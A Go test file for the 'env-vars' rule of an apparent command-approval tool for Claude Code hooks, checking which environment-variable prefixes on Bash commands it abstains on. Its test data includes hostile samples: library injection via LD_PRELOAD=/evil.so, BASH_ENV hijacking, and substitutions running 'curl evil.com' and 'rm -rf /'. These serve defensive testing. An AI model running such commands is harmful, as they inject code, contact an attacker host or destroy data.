package envvars

import (
	"encoding/json"
	"testing"

	"github.com/phillipgreenii/claude-extended-tool-approver/internal/hookio"
)

func mustJSON(v any) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}

func TestEnvVars_DangerousVars_Abstain(t *testing.T) {
	r := New()
	commands := []string{
		"LD_PRELOAD=/evil.so git status",
		"DYLD_INSERT_LIBRARIES=/evil.dylib ls",
		"LD_LIBRARY_PATH=/evil git log",
		"DYLD_LIBRARY_PATH=/evil git log",
		"PATH=/custom/bin git status",
		"HOME=/tmp git status",
		"BASH_ENV=/evil.sh echo hi",
		"ENV=/evil.sh echo hi",
		"ZDOTDIR=/evil echo hi",
	}
	for _, cmd := range commands {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Abstain {
			t.Errorf("cmd %q: got %s, want abstain", cmd, got.Decision)
		}
	}
}

func TestEnvVars_UnknownExpression_Abstain(t *testing.T) {
	r := New()
	commands := []string{
		"FOO=$(curl evil.com) git status",
		"FOO=$(rm -rf /) echo hi",
		"FOO=`curl evil` ls",
	}
	for _, cmd := range commands {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Abstain {
			t.Errorf("cmd %q: got %s, want abstain", cmd, got.Decision)
		}
	}
}

func TestEnvVars_SafeStaticVars_Abstain(t *testing.T) {
	r := New()
	commands := []string{
		"PYTHONPATH=/foo bin/pytool run",
		"NO_COLOR=1 ls",
		"GOFLAGS=-count=1 go test",
		"GIT_DIR=/other git log",
		"KUBECONFIG=/other kubectl get pods",
	}
	for _, cmd := range commands {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Abstain {
			t.Errorf("cmd %q: got %s, want abstain", cmd, got.Decision)
		}
	}
}

func TestEnvVars_SafeExpressions_Abstain(t *testing.T) {
	r := New()
	commands := []string{
		"FOO=$(mktemp -d) cmd",
		"FOO=$HOME cmd",
		"FOO=${USER:-nobody} cmd",
		"FOO=$((1+2)) cmd",
		"FOO=$(date +%F) cmd",
		"FOO=`whoami` cmd",
	}
	for _, cmd := range commands {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := r.Evaluate(input)
		if got.Decision != hookio.Abstain {
			t.Errorf("cmd %q: got %s, want abstain", cmd, got.Decision)
		}
	}
}

func TestEnvVars_NoEnvVars_Abstain(t *testing.T) {
	r := New()
	input := &hookio.HookInput{
		ToolName:  "Bash",
		ToolInput: mustJSON(map[string]string{"command": "git status"}),
	}
	got := r.Evaluate(input)
	if got.Decision != hookio.Abstain {
		t.Errorf("git status (no env vars): got %s, want abstain", got.Decision)
	}
}

func TestEnvVars_NonBash_Abstain(t *testing.T) {
	r := New()
	input := &hookio.HookInput{
		ToolName:  "Read",
		ToolInput: mustJSON(map[string]string{"file_path": "/tmp/x"}),
	}
	got := r.Evaluate(input)
	if got.Decision != hookio.Abstain {
		t.Errorf("Read tool: got %s, want abstain", got.Decision)
	}
}

func TestEnvVars_Name(t *testing.T) {
	r := New()
	if got := r.Name(); got != "env-vars" {
		t.Errorf("Name() = %q, want env-vars", got)
	}
}
